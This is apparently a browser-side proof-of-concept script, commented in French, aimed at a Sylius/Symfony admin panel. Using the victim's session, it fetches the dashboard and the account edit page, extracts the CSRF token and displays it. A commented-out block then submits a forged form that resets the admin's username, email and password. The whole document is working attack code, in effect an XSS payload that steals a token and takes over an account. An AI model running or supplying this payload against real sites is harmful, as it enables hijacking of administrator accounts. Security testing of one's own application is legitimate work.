(async () => {
  try {
    // 0) Options à adapter à TON app
    const dashboardPath = '/admin/';                 // page d'accueil back-office
    const isEditUrl = (href) => /^\/admin\/users\/\d+\/edit$/.test(href); // règle pour reconnaître l'URL d'édition
    const csrfSelectors = [
      'input[name="sylius_admin_user[_token]"]',     // Sylius/Symfony (exemple)
      'input[name$="[_token]"]',
      'input[name="_csrf_token"]'
    ];

    // 1) Aller sur le dashboard pour récupérer un lien « My account » -> /admin/users/<id>/edit
    const dashResp = await fetch(dashboardPath, { credentials: 'include' });
    if (!dashResp.ok) throw new Error(`Dashboard HTTP ${dashResp.status}`);
    if (/\/login\b/.test(dashResp.url)) { alert('Session expirée (redirigé login).'); return; }

    const dashHtml = await dashResp.text();
    const dashDoc  = new DOMParser().parseFromString(dashHtml, 'text/html');

    // Tenter de trouver le lien “My account” explicite
    let editHref = null;
    const menuLinks = Array.from(dashDoc.querySelectorAll('a[href]'));
    const myAccount = menuLinks.find(a => a.textContent?.trim().toLowerCase() === 'my account' && a.getAttribute('href'));
    if (myAccount) editHref = myAccount.getAttribute('href');

    // Fallback : n’importe quel lien qui “ressemble” à /admin/users/<id>/edit
    if (!editHref) {
      const guess = menuLinks.find(a => isEditUrl(a.getAttribute('href') || ''));
      if (guess) editHref = guess.getAttribute('href');
    }

    if (!editHref) { alert('URL d’édition introuvable depuis le dashboard.'); return; }

    // 2) Charger la page d’édition
    const editResp = await fetch(editHref, { credentials: 'include' });
    if (!editResp.ok) throw new Error(`Edit HTTP ${editResp.status}`);
    if (/\/login\b/.test(editResp.url)) { alert('Session expirée (redirigé login).'); return; }

    const editHtml = await editResp.text();
    const editDoc  = new DOMParser().parseFromString(editHtml, 'text/html');

    // 3) Extraire le token CSRF
    let token = null;
    for (const sel of csrfSelectors) {
      const input = editDoc.querySelector(sel);
      if (input?.value) { token = input.value; break; }
    }

    if (!token) { alert('CSRF token introuvable sur la page d’édition.'); return; }

    // 4a) PoC visuel
    alert('CSRF token = ' + token);

    // 4b) (optionnel) Automatiser une modification comme le ferait le formulaire
    //     -> décommente si c’est TON site et que tu veux soumettre :
    /*
    const formData = new FormData();
    formData.set('_method', 'PUT'); // si ton framework l’utilise
    formData.set('sylius_admin_user[username]', 'Alice');      // adapte les noms
    formData.set('sylius_admin_user[email]', 'alice@example.com');
    formData.set('sylius_admin_user[plainPassword]', 'Pwd!234567890');
    formData.set('sylius_admin_user[enabled]', '1');
    formData.set('sylius_admin_user[firstName]', 'Alice');
    formData.set('sylius_admin_user[lastName]', 'Doe');
    formData.set('sylius_admin_user[localeCode]', 'en_US');
    formData.set('sylius_admin_user[_token]', token);

    const submitResp = await fetch(editHref, {
      method: 'POST',
      credentials: 'include',
      body: formData
    });
    console.log('Submit status', submitResp.status);
    */
  } catch (err) {
    console.error(err);
    alert('Erreur: ' + (err?.message || err));
  }
})();
